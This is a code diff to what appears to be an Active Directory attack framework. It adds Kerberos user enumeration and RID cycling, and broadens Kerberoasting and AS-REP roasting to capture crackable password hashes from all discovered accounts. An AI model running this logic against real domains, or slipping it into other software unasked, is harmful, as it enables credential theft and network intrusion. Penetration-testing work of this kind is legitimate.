@@ -13,12 +13,13 @@ use chrono::{Datelike, Utc};
 use colored::Colorize;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::exec::smbexec::escape_cmd_metacharacters;
-use overthrone_core::proto::{kerberos, ldap, smb::SmbSession};
+use overthrone_core::proto::{kerberos, ldap, rid, smb::SmbSession};
 use overthrone_hunter::HuntConfig;
 use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod};
 use overthrone_hunter::constrained::ConstrainedConfig;
 use overthrone_hunter::rbcd::RbcdConfig;
 use overthrone_hunter::unconstrained::UnconstrainedConfig;
+use overthrone_hunter::userenum::{self, UserEnumConfig};
 use std::collections::{HashMap, HashSet};
 use std::path::PathBuf;
 use tracing::{debug, info, warn};
@@ -137,7 +138,7 @@ pub async fn execute_step(
             | PlannedAction::AdcsEsc4 { .. }
     );
     if requires_ldap && !ctx.ldap_available {
-        let msg = format!("Skipped: LDAP authentication failed — {}", step.description);
+        let msg = format!("Skipped: LDAP service unavailable — {}", step.description);
         warn!("{}", msg);
         state.log_action(&step.stage.to_string(), &step.description, "", false, &msg);
         return StepResult {
@@ -161,6 +162,10 @@ pub async fn execute_step(
             exec_enumerate_shares(ctx, state, target).await
         }
         PlannedAction::CheckAdminAccess { targets } => exec_check_admin(ctx, state, targets).await,
+        PlannedAction::UserEnum { wordlist } => exec_user_enum(ctx, state, wordlist).await,
+        PlannedAction::RidCycle { start_rid, end_rid } => {
+            exec_rid_cycle(ctx, state, *start_rid, *end_rid).await
+        }
         PlannedAction::AsRepRoast { users } => exec_asrep_roast(ctx, state, users).await,
         PlannedAction::Kerberoast { spns } => exec_kerberoast(ctx, state, spns).await,
         PlannedAction::ConstrainedDelegation {
@@ -1337,6 +1342,119 @@ async fn exec_check_admin(
     }
 }
 
+async fn exec_user_enum(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    wordlist: &str,
+) -> StepResult {
+    let uc = UserEnumConfig {
+        userlist: PathBuf::from(wordlist),
+        ..Default::default()
+    };
+
+    match userenum::run(&ctx.dc_ip, &ctx.domain, &uc, ctx.jitter_ms).await {
+        Ok(res) => {
+            let mut new_users = 0;
+            for u in &res.valid_users {
+                if !state.users.iter().any(|v| v.sam_account_name == *u) {
+                    state.users.push(DiscoveredUser {
+                        sam_account_name: u.clone(),
+                        distinguished_name: format!("CN={},(kerberos-discovered)", u),
+                        ..Default::default()
+                    });
+                    new_users += 1;
+                }
+            }
+
+            let mut new_creds = 0;
+            for capture in &res.no_preauth_users {
+                state.asrep_roastable.push(capture.username.clone());
+                state.roast_hashes.push(capture.hash_string.clone());
+                new_creds += 1;
+            }
+
+            let msg = format!(
+                "Kerberos user enum: {} valid users found ({} new), {} AS-REP hashes captured",
+                res.valid_users.len(),
+                new_users,
+                res.no_preauth_users.len()
+            );
+            info!("{} {}", "  ✓".green(), msg);
+            StepResult {
+                success: true,
+                output: msg,
+                new_credentials: new_creds,
+                new_admin_hosts: 0,
+            }
+        }
+        Err(e) => StepResult {
+            success: false,
+            output: format!("Kerberos user enum failed: {e}"),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        },
+    }
+}
+
+async fn exec_rid_cycle(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    start_rid: u32,
+    end_rid: u32,
+) -> StepResult {
+    let (user, pass, _) = ctx.effective_creds();
+    let config = rid::RidCycleConfig {
+        target: ctx.dc_ip.clone(),
+        domain: ctx.domain.clone(),
+        username: user.to_string(),
+        password: pass.to_string(),
+        null_session: false,
+        start_rid,
+        end_rid,
+        batch_size: 50,
+    };
+
+    match rid::rid_cycle(&config).await {
+        Ok(res) => {
+            let mut new_users = 0;
+            let mut users_found = 0;
+            for r in &res {
+                if matches!(r.account_type, rid::RidAccountType::User) {
+                    users_found += 1;
+                    if !state.users.iter().any(|v| v.sam_account_name == r.name) {
+                        state.users.push(DiscoveredUser {
+                            sam_account_name: r.name.clone(),
+                            distinguished_name: format!("CN={},(rid-discovered)", r.name),
+                            ..Default::default()
+                        });
+                        new_users += 1;
+                    }
+                }
+            }
+
+            let msg = format!(
+                "RID cycling: {} accounts found ({} users, {} new)",
+                res.len(),
+                users_found,
+                new_users
+            );
+            info!("{} {}", "  ✓".green(), msg);
+            StepResult {
+                success: true,
+                output: msg,
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            }
+        }
+        Err(e) => StepResult {
+            success: false,
+            output: format!("RID cycling failed: {e}"),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        },
+    }
+}
+
 fn mark_credential_admin(state: &mut EngagementState, attempt: &SmbAttempt, target: &str) {
     for cred in state.credentials.values_mut() {
         if normalize_smb_username(&cred.username).eq_ignore_ascii_case(&attempt.username)
@@ -1357,7 +1475,7 @@ fn mark_credential_admin(state: &mut EngagementState, attempt: &SmbAttempt, targ
 async fn exec_kerberoast(
     ctx: &ExecContext,
     state: &mut EngagementState,
-    _spns: &[String],
+    spns: &[String],
 ) -> StepResult {
     let (user, pass, use_hash) = ctx.effective_creds();
 
@@ -1374,11 +1492,27 @@ async fn exec_kerberoast(
         }
     };
 
-    let targets = state.kerberoastable.clone();
+    // Use provided SPNs, or those from state, or try to find some
+    let mut targets = if !spns.is_empty() {
+        spns.to_vec()
+    } else {
+        state.kerberoastable.clone()
+    };
+
+    if targets.is_empty() && !ctx.ldap_available {
+        // Fallback: if LDAP is down, try to roast the users we found via Kerberos/RID enum
+        // by requesting a TGS for their sAMAccountName (works if they are service accounts)
+        targets = state
+            .users
+            .iter()
+            .map(|u| u.sam_account_name.clone())
+            .collect();
+    }
+
     if targets.is_empty() {
         return StepResult {
             success: true,
-            output: "No kerberoastable accounts found".to_string(),
+            output: "No kerberoastable targets found".to_string(),
             new_credentials: 0,
             new_admin_hosts: 0,
         };
@@ -1387,22 +1521,16 @@ async fn exec_kerberoast(
     let mut hash_count = 0;
     let mut error_counts: HashMap<String, usize> = HashMap::new();
     for account in &targets {
-        // Look up real SPNs from LDAP enumeration
-        let spns = match state.spn_map.get(account) {
+        // Look up real SPNs from LDAP enumeration if available
+        let account_spns = match state.spn_map.get(account) {
             Some(s) if !s.is_empty() => s.clone(),
             _ => {
-                // No SPNs discovered for this account — skip rather than
-                // fabricating a fake SPN that will always fail.
-                debug!(
-                    "  {} {} has no SPNs in spn_map, skipping",
-                    "→".dimmed(),
-                    account
-                );
-                continue;
+                // No SPNs discovered — if we are in fallback mode, try the account name itself
+                vec![account.clone()]
             }
         };
 
-        for spn in &spns {
+        for spn in &account_spns {
             match kerberos::kerberoast(&ctx.dc_ip, &tgt, spn).await {
                 Ok(hash) => {
                     info!(
@@ -1453,24 +1581,20 @@ async fn exec_kerberoast(
     }
 
     let msg = if hash_count > 0 {
-        format!(
-            "Kerberoast: {} hashes from {} targets",
-            hash_count,
-            targets.len()
-        )
-    } else if let Some(summary) = dominant_error_summary(&error_counts) {
-        format!(
-            "Kerberoast: 0 hashes from {} targets ({})",
-            targets.len(),
-            summary
-        )
+        format!("Kerberoast: captured {} TGS hashes", hash_count)
     } else {
         format!(
-            "Kerberoast: {} hashes from {} targets",
-            hash_count,
-            targets.len()
+            "Kerberoast: 0 hashes captured ({} errors: {:?})",
+            error_counts.values().sum::<usize>(),
+            error_counts
         )
     };
+
+    info!(
+        "{} {}",
+        if hash_count > 0 { "  ✓" } else { "  ✗" }.yellow(),
+        msg
+    );
     StepResult {
         success: hash_count > 0,
         output: msg,
@@ -1479,32 +1603,31 @@ async fn exec_kerberoast(
     }
 }
 
-fn dominant_error_summary(error_counts: &HashMap<String, usize>) -> Option<String> {
-    error_counts
-        .iter()
-        .max_by_key(|(_, count)| **count)
-        .map(|(error, count)| format!("dominant error x{}: {}", count, truncate_error(error)))
-}
-
-fn truncate_error(error: &str) -> String {
-    const MAX_LEN: usize = 120;
-    if error.len() <= MAX_LEN {
-        error.to_string()
-    } else {
-        format!("{}...", &error[..MAX_LEN])
-    }
-}
-
 async fn exec_asrep_roast(
     ctx: &ExecContext,
     state: &mut EngagementState,
-    _users: &[String],
+    users: &[String],
 ) -> StepResult {
-    let targets = state.asrep_roastable.clone();
+    // Use provided users, or those from state, or fallback to all discovered users if LDAP is down
+    let mut targets = if !users.is_empty() {
+        users.to_vec()
+    } else {
+        state.asrep_roastable.clone()
+    };
+
+    if targets.is_empty() && !ctx.ldap_available {
+        // Fallback: if LDAP is down, try roasting all discovered users (from Kerberos/RID enum)
+        targets = state
+            .users
+            .iter()
+            .map(|u| u.sam_account_name.clone())
+            .collect();
+    }
+
     if targets.is_empty() {
         return StepResult {
             success: true,
-            output: "No AS-REP roastable accounts".to_string(),
+            output: "No AS-REP roastable targets found".to_string(),
             new_credentials: 0,
             new_admin_hosts: 0,
         };
@@ -1522,58 +1645,25 @@ async fn exec_asrep_roast(
             Err(e) => {
                 let error_text = e.to_string();
                 *error_counts.entry(error_text).or_insert(0) += 1;
-                debug!("{} {} {}", "  ✗".dimmed(), user, e);
             }
         }
         ctx.jitter().await;
     }
 
-    // Write AS-REP hashes to loot directory
-    if hash_count > 0 {
-        let loot_dir = std::path::PathBuf::from("./loot");
-        let _ = std::fs::create_dir_all(&loot_dir);
-        let hash_file = loot_dir.join("asrep_hashes.txt");
-        if let Ok(mut f) = std::fs::OpenOptions::new()
-            .create(true)
-            .append(true)
-            .open(&hash_file)
-        {
-            use std::io::Write;
-            for h in state
-                .roast_hashes
-                .iter()
-                .skip(state.roast_hashes.len().saturating_sub(hash_count))
-            {
-                let _ = writeln!(f, "{}", h);
-            }
-            info!(
-                "  {} Wrote {} hashes to {}",
-                "→".cyan(),
-                hash_count,
-                hash_file.display()
-            );
-        }
-    }
-
     let msg = if hash_count > 0 {
-        format!(
-            "AS-REP Roast: {} hashes from {} targets",
-            hash_count,
-            targets.len()
-        )
-    } else if let Some(summary) = dominant_error_summary(&error_counts) {
-        format!(
-            "AS-REP Roast: 0 hashes from {} targets ({})",
-            targets.len(),
-            summary
-        )
+        format!("AS-REP Roast: captured {} hashes", hash_count)
     } else {
         format!(
-            "AS-REP Roast: {} hashes from {} targets",
-            hash_count,
-            targets.len()
+            "AS-REP Roast: 0 hashes captured ({} errors)",
+            error_counts.values().sum::<usize>()
         )
     };
+
+    info!(
+        "{} {}",
+        if hash_count > 0 { "  ✓" } else { "  ✗" }.yellow(),
+        msg
+    );
     StepResult {
         success: hash_count > 0,
         output: msg,
